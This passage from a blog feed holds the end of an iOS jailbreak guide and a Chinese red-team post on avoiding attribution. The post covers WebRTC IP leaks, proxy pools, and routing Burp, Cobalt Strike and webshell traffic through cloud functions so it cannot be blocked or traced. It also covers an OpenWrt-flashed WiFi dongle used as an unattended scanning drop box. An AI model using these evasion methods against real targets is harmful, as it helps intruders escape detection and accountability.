<h3 id="Semi-Tethered-Jailbreaks"><a href="#Semi-Tethered-Jailbreaks" class="headerlink" title="#Semi-Tethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#semi-tethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Semi-Tethered Jailbreaks</h3><hr>
<p>Semi-tethered jailbreaks are very similar to semi-untethered jailbreaks, however the exploit must be ran using a computer rather than using a sideloaded app.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://ios.cfw.guide/assets/images/checkra1n.png"
                      alt="A screenshot of the checkra1n jailbreak"
                ><figcaption>A screenshot of the checkra1n jailbreak</figcaption></figure></p>
<p>Due to requiring a computer to rejailbreak after every reboot, most choose to use a semi-untethered jailbreak instead.</p>
<p>An example of a semi-tethered jailbreak is <a class="link"   href="https://ios.cfw.guide/installing-odysseyra1n" >Odysseyra1n <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
<h3 id="Tethered-Jailbreaks"><a href="#Tethered-Jailbreaks" class="headerlink" title="#Tethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#tethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Tethered Jailbreaks</h3><hr>
<p>Tethered jailbreaks are not meant to be used by the general public. These exploits modify the device in a way that it requires a PC to even boot at all, even without a jailbreak.</p>
<p>Because of this, these tend to only be used by jailbreak developers getting ready for a newer version of iOS.</p>
<p>越狱工具-》适用于不同版本手机和ios版本</p>
]]></content>
  </entry>
  <entry>
    <title>红队的夜行衣——反反制的那些事</title>
    <url>/2023/06/12/%E7%BA%A2%E9%98%9F%E7%9A%84%E5%A4%9C%E8%A1%8C%E8%A1%A3%E2%80%94%E2%80%94%E5%8F%8D%E5%8F%8D%E5%88%B6%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    <content><![CDATA[<blockquote>
<p>有同志问了，那我就献丑了。</p>
</blockquote>
<h2 id="蓝队在防什么"><a href="#蓝队在防什么" class="headerlink" title="蓝队在防什么"></a>蓝队在防什么</h2><p>作为多年参与蓝队的点鼠标猴子，我简单讲讲猴子平常干点啥。<br>先不涉及蓝队的前期布防，直接讲攻防进行时。</p>
<ul>
<li>监控：通过安全设备，发现异常流量，定位发起者ip和url，将相关流量情况上报给研判。<br></li>
<li>研判：在第一天的时候也会做点监控的活，将发现的异常流量进行分析，确认流量中的行为是否是红方攻击流量，需要与甲方的技术人员进行沟通确认。如果发现流量中存在红方身份特征，同时会要求溯源人员进行及时响应。<br></li>
<li>指挥：背锅的<br>
通常甲方不会外聘“指挥”，当然，如果指挥也是甲方外聘的，那么乙方能放进甲方的岗位通常就这三种，至于溯源嘛，那是乙方原厂自己的人，想参与溯源的临时参与者就别想了。<br>
综上，蓝队会从安全设备中发现并提取带有 *攻击特征* 的流量信息，同时会从蜜罐中寻找同样特征的信息，并确认红方身份，进行溯源，同时IP封禁。</li>
</ul>
<h2 id="打铁还需自身硬"><a href="#打铁还需自身硬" class="headerlink" title="打铁还需自身硬"></a>打铁还需自身硬</h2><p>作为红队，除了需要有足够强悍的<em>外网打点</em>、<em>漏洞挖掘</em> 、<em>内网渗透</em>这些实力外，还需要在反溯源、反定位、反暴露、流量特征隐藏等手段中磨练，以下是笔者意识到的部分问题。</p>
<h3 id="WebRTC——真实IP暴露的罪魁祸首"><a href="#WebRTC——真实IP暴露的罪魁祸首" class="headerlink" title="WebRTC——真实IP暴露的罪魁祸首"></a>WebRTC——真实IP暴露的罪魁祸首</h3><p>说起这件事，还要从今年微博博主：安全北北的一篇微博说起<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230608145739.1fjkjpneb77k.png"
                      alt="Pasted-image-20230608145739" 
                ><figcaption>Pasted-image-20230608145739</figcaption></figure><br>获取ip的网站：<br><a class="link"   href="https://www.hackjie.com/tracking" >https://www.hackjie.com/tracking <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://ip8.com/webrtc-test" >https://ip8.com/webrtc-test <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>打开网站后我们发现自己的ip直接就在网站上显示出来了，这事谁看谁崩溃 ，于是就有了这样一个疑问：为什么即使平常有挂代理的习惯，还是会暴露外网ip呢？</p>
<blockquote>
<ul>
<li><strong>什么是WebRTC？</strong><br> 网络实时通信（WebRTC）是一项先进的开源技术，允许台式机和移动浏览器通过使用简单的API实时交换数据。<br> WebRTC有大量的用途，包括通过移动或基于网络的应用实现音频、视频和网络功能。WebRTC的功能类似于媒体捕获和流媒体API。所有这三种功能可以结合起来，实现网络上前所未有的惊人的多媒体功能。<br> WebRTC的关键优势在于它能实现实时的点对点多媒体通信，这在当今的数字媒体时代是不可缺少的。</li>
<li><strong>关键组成部分</strong><br>  WebRTC包括3个主要的API：<br>  - 同行连接：这允许你发送和接收多媒体文件<br>  - GetUserMedia：顾名思义，它可以访问用户的媒体（如摄像头和麦克风）。<br>  - 数据通道：允许在浏览器之间直接传输非媒体。</li>
</ul>
</blockquote>
<pre><code>    WebRTC目前在以下浏览器上得到支持：Mozilla Firefox, Opera, Chrome和Google Chrome。
</code></pre>
<blockquote>
<ul>
<li><strong>反面</strong><br>  WebTRC的一个主要缺点是，由于用户使用的VPN泄露了他们的IP地址，用户的隐私可能会受到影响。<br>  由Paolo Stagno在2015年发现并标记为 “WebTRC泄漏”，当一些知名的VPN供应商开始在未经用户同意的情况下将用户的IP地址泄露给网站时，一些用户的隐私被泄露了。<br>  更糟糕的是，最近的一项调查指出，有23%的VPN供应商正在泄露用户的IP地址，并保留了设备类型、个人信息、访问过的网站，甚至是支付信息等个人信息。</li>
</ul>
<p>简单来说就是，WebRTC这个技术，直接将你的浏览器和服务端建立联系，绕过了中间所有的代理。</p>
</blockquote>
<p>我们打开B站搜索WebRTC，会看到，这个技术经常应用于视频通话、点对点通信等等。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230608151944.4au5uej22hk0.png"
                      alt="Pasted-image-20230608151944" 
                ><figcaption>Pasted-image-20230608151944</figcaption></figure></p>
<blockquote>
<ul>
<li><strong>防范策略</strong></li>
</ul>
</blockquote>
<ol>
<li>直接从浏览器扩展入手：<br> 下载并安装Chrome&#x2F;Edge&#x2F;Firefox浏览器扩展：WebRTC Leak Shield<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">https://chrome.google.com/webstore/detail/webrtc-leak-shield/bppamachkoflopbagkdoflbgfjflfnfl  </span><br><span class="line"></span><br><span class="line">https://microsoftedge.microsoft.com/addons/detail/pblfgfehcokbglafpcldgjpmknildihk  </span><br><span class="line"></span><br><span class="line">https://addons.mozilla.org/en-US/firefox/addon/webrtc-leak-shield/</span><br></pre></td></tr></table></figure></div></li>
<li>从浏览器本身配置入手：<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">chrome://flags/#enable-webrtc-hide-local-ips-with-mdns  </span><br><span class="line">opera://flags/#enable-webrtc-hide-local-ips-with-mdns  </span><br><span class="line">edge://flags/#enable-webrtc-hide-local-ips-with-mdns</span><br></pre></td></tr></table></figure></div>
但经过测试，还是扩展好用<br> Firefox配置项：<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">about:config  </span><br><span class="line">media.peerconnection.enabled</span><br></pre></td></tr></table></figure></div>
FireFox不需要扩展，直接配置就比上面那些搞扩展的好使。</li>
</ol>
<blockquote>
<ul>
<li><strong>再测试</strong>：</li>
</ul>
</blockquote>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230608153324.75gq8evsrd80.png"
                      alt="Pasted-image-20230608153324" 
                ><figcaption>Pasted-image-20230608153324</figcaption></figure>

<h2 id="代理池"><a href="#代理池" class="headerlink" title="代理池"></a>代理池</h2><p>作为一个红队成员，在打点过程中，最讨厌的就是信息还在收集，扫描器还在运行时，突然就拿不到数据了，不用问，被封ip了。<br>但信息收集和找口子阶段少不了大批量的扫描流量的发送了，这就需要红队自身要有足够多的ip喂给蓝队去封禁。<br>介绍几个代理池项目：<br><a class="link"   href="https://github.com/jhao104/proxy_pool" >https://github.com/jhao104/proxy_pool <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://github.com/Anyyy111/ProxyPoolxSocks" >https://github.com/Anyyy111/ProxyPoolxSocks <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>代理池的原理和代理服务器一样，没啥好讲的，只不过用于爬虫的代理服务器会快速更换代理ip，直到ip池中的ip都被封禁。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230608161458.46xcx17x4o80.png"
                      alt="Pasted-image-20230608161458" 
                ><figcaption>Pasted-image-20230608161458</figcaption></figure><br>啥？你问我ip从哪来？买的，找ip提供商买的，和你科学上网买梯子是一回事。</p>
<hr>
<p>以上都是简单可操作的部分，接下来就要上强度了</p>
<hr>
<h2 id="云函数"><a href="#云函数" class="headerlink" title="云函数"></a>云函数</h2><blockquote>
<p>总结这一块知识的时候，感觉这一块内容太丰富，甚至应该单独开一篇来写</p>
</blockquote>
<h4 id="什么是云函数"><a href="#什么是云函数" class="headerlink" title="什么是云函数"></a>什么是云函数</h4><pre><code>云函数提供了一种直接在云上运行，无状态的、短暂的、由事件触发的代码的能力。
对比：
随着云服务的发展，计算资源高度抽象化，腾讯云提供了从物理服务器到云函数和横跨各种抽象程度的计算资源供用户选择。
黑石物理服务器：以物理机为扩展单位。用户完全拥有整台实体计算资源，安全性最好。
云服务器：以云服务器为扩展单位，虚拟化硬件设备。用户和其他租户共享物理机资源，仍可自行配置 CVM 的各项指标，相对部署和迭代更加简单。
容器服务：以服务为扩展单位，虚拟化操作系统。测试和生产环境完全一致，测试和部署非常轻松。
云函数：以函数为扩展单位，虚拟化运行时环境（Runtime）。是现有计算资源的最小单位，具有完全自动、一键部署、高度可扩展等特点，是轻量级服务部署非常好的选择。
【引自腾讯云文档】
</code></pre>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612180542.1860haoz2q1s.png"
                      alt="Pasted-image-20230612180542" 
                ><figcaption>Pasted-image-20230612180542</figcaption></figure>

<p><strong>特性：</strong></p>
<ol>
<li>云函数不需要服务器，也就是说你不需要去买 VPS。 <br></li>
<li>云函数只是云厂商用自己的服务器帮你运行你上传的代码片段， 执行某个单一的逻辑，可以简单理解为只帮你执行一个函数。 <br></li>
<li>云函数无法长驻，调用的时候创建，执行完之后立即就销毁，所以无法直接保存状态。也正是这一点，让我们无法代理像 SSH 这种需要长连接的服务，只能代理 HTTP(s) 这种无状态的协议。 <br></li>
</ol>
<p>利用云厂商提供的云函数（函数计算）功能，将客户端的HTTP请求进行转发，由于云函数多出口的特性，让我们也变相拥有了代理池。</p>
<p>当前国内已知云平台，阿里云和腾讯云都可以使用云函数。</p>
<h4 id="怎么使用云函数"><a href="#怎么使用云函数" class="headerlink" title="怎么使用云函数"></a>怎么使用云函数</h4><p>目标：将burp、CS、webshell等攻击流量全部通过云函数代理，以达到不可封禁和不可溯源的效果。</p>
<p>设计：<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612191411.4pyo23tedpc0.png"
                      alt="Pasted-image-20230612191411" 
                ><figcaption>Pasted-image-20230612191411</figcaption></figure><br>如图，浏览器访问流量经过本地代理程序，转发到云服务端，经由写好的云函数将我们发出的流量进行重新打包，并由云服务的DNS再次发送至目标站点。<br>从目标站点来看，我们发送的流量，都是由云服务商提供的ip进行的访问。<br>更有趣的是，无论是微步qax的威胁情报平台都会记录来自云服务商的干净ip。</p>
<p>于是我们根据场景，可以制作【基于云函数的socks代理】和【基于云函数的http代理】</p>
<p>以腾讯云为例<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612192152.3kucz59u5iw0.png"
                      alt="Pasted-image-20230612192152" 
                ><figcaption>Pasted-image-20230612192152</figcaption></figure><br>在腾讯云控制台，找到函数服务，新建云函数<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612192951.5h98nsy4xks0.png"
                      alt="Pasted-image-20230612192951" 
                ><figcaption>Pasted-image-20230612192951</figcaption></figure><br>云函数可以使用多种语言编写，当前已知的项目都是python写的<br>建议牛逼的大佬都用go来写<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612193221.3wf994r3qvy0.png"
                      alt="Pasted-image-20230612193221" 
                ><figcaption>Pasted-image-20230612193221</figcaption></figure><br>之后配置timeout的时间，900秒，足够大佬在被封前拿到想要的数据了。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612193411.10pazdrlztxs.png"
                      alt="Pasted-image-20230612193411" 
                ><figcaption>Pasted-image-20230612193411</figcaption></figure><br>设置API触发<br>以上就是腾讯云的云函数实现socks代理的办法</p>
<p>http这一块相比，就是多了个鉴权，去B站还能找到添加了ssl证书的https版本。</p>
<p>可以看一下渣渣老师在2021年发布的腾讯云云函数代理办法:</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1x64y1873g/?share_source=copy_web&vd_source=c5b1bc1a031a95bca5007f137fe846b8" >https://www.bilibili.com/video/BV1x64y1873g/?share_source=copy_web&amp;vd_source=c5b1bc1a031a95bca5007f137fe846b8 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>也可也看看大C老师做的基于阿里云云函数代理办法，这个是用go写的:</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV1ML4y1M7Cu/?share_source=copy_web&vd_source=c5b1bc1a031a95bca5007f137fe846b8" >https://www.bilibili.com/video/BV1ML4y1M7Cu/?share_source=copy_web&amp;vd_source=c5b1bc1a031a95bca5007f137fe846b8 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>啥？不会写？行吧，有位大佬在Github上发布了一键部署项目:<br> <a class="link"   href="https://github.com/shimmeris/SCFProxy/blob/main/README_zh.md" >https://github.com/shimmeris/SCFProxy/blob/main/README_zh.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>还看不懂就真的帮不了你了。</p>
<h2 id="利用硬件隐身"><a href="#利用硬件隐身" class="headerlink" title="利用硬件隐身"></a>利用硬件隐身</h2><p>这一块就没什么难的，我一句话概括：<strong>用手机开热点</strong></p>
<p>我就知道你会骂我</p>
<ul>
<li><p>手机开热点为什么好使吗？</p>
<p>  前面WebRTC中讲到，如果你使用宽带上网，服务器会获取你的公网ip，而公网ip都是由运营商提供的，除非你很有钱，买了一个独享的ip专线，否则，你就是和整个小区，甚至整个街区共用同一个ip。因此，ip定位不会太详细。</p>
</li>
</ul>
<p>比如，笔者所在的这个小县城共用一个ip。。。（手动狗头）</p>
<ul>
<li><p>问题又来了，手机开热点，也是运营商提供的上网服务啊，怎么就找不到呢？</p>
<p>  已知手机上网的办法并不是宽带的那一套，而是WCDMA的那一套东西，使用的ip是由基站分配的，也不会太详细。</p>
</li>
</ul>
<p>但即使不详细，这个定位依然很好使啊，至少它定位到了搞事情所在的城市甚至小区啊。<br><br><br>这里就用到了一个不起眼的小玩具：<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612201324.5gs0c61u0280.webp"
                      alt="Pasted-image-20230612201324" 
                ><figcaption>Pasted-image-20230612201324</figcaption></figure></p>
<p>没错就是 <strong>随身WIFI</strong></p>
<p>还是手机开热点的那一套</p>
<p>但可以实现匿名的点在 <strong>流量卡</strong> 上，笔者曾经记录使用流量卡上网时的ip<br>每次ip定位都在不同的城市，从来就没有过ip定位在所在地附近的情况。<br>于是，渗透机流量经过随身WIFI转发，再经由14层协议到达目标，目标机上记录的ip就是和你丝毫没关系的运营商基站ip。</p>
<p>但这就完事了吗？这也太没劲了</p>
<p>如图，笔者把随身WIFI拆了，并深入进去逆了一下。</p>
<p>硬件：CPU4核｜ROM512MB｜RAM4GB</p>
<p>架构：ARM v7 Processor rev0（v7l）</p>
<p>自带系统：Android4.4</p>
<p>熟不熟悉？就是手机！</p>
<p>红米2的配置！</p>
<p>虽然性能不大，但是刷进去一个arm的linux系统不是刚刚好嘛？<br>于是我刷了个OpenWrt</p>
<p>然后连进去看看<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612205751.30odvevfqvi0.webp"
                      alt="Pasted-image-20230612205751" 
                ><figcaption>Pasted-image-20230612205751</figcaption></figure><br>ok这就是个linux机子！</p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612215035.6r5d92tsx640.webp"
                      alt="Pasted-image-20230612215035" 
                ><figcaption>Pasted-image-20230612215035</figcaption></figure>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/anonymous/Pasted-image-20230612215209.nkhbabb287k.webp"
                      alt="Pasted-image-20230612215209" 
                ><figcaption>Pasted-image-20230612215209</figcaption></figure>

<p>同时还可以安装Debian，Debian这一块我还没试<br>但是我们大胆推测<br>linux都有了，ssh上去，一顿nmap &amp;&amp; subfinder | httpx | nuclei<br>那可太爽了<br>甚至，写进去自动化渗透脚本，再把棒子找个信号好、有电源的地方一放<br>近源渗透的事也解决了有没有？</p>
<p>说回主题，既然这个随身WIFI棒子就是一个linux机子，那么我们把代理池云函数等同时集成到棒子上，我们就直接实现了随身软路由。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章我们从多种角度实现了红队的自我隐匿，而且付出代价不多。还方便逃跑。</p>
<hr>
<blockquote>
<p>参考：<br><a class="link"   href="https://mp.weixin.qq.com/s/A5dd7WXojGBzsz52_iLtJQ" >https://mp.weixin.qq.com/s/A5dd7WXojGBzsz52_iLtJQ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://cloud.tencent.com/developer/article/1857034" >https://cloud.tencent.com/developer/article/1857034 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://cloud.tencent.com/document/product/583/9694" >https://cloud.tencent.com/document/product/583/9694 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.cnblogs.com/supdon/p/15099742.html" >https://www.cnblogs.com/supdon/p/15099742.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://github.com/shimmeris/SCFProxy/blob/main/README_zh.md" >https://github.com/shimmeris/SCFProxy/blob/main/README_zh.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://qust.me/post/m[sm8916](https://acg.tv/sm8916)/" >https://qust.me/post/m[sm8916](https://acg.tv/sm8916)/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
]]></content>
  </entry>
</search>
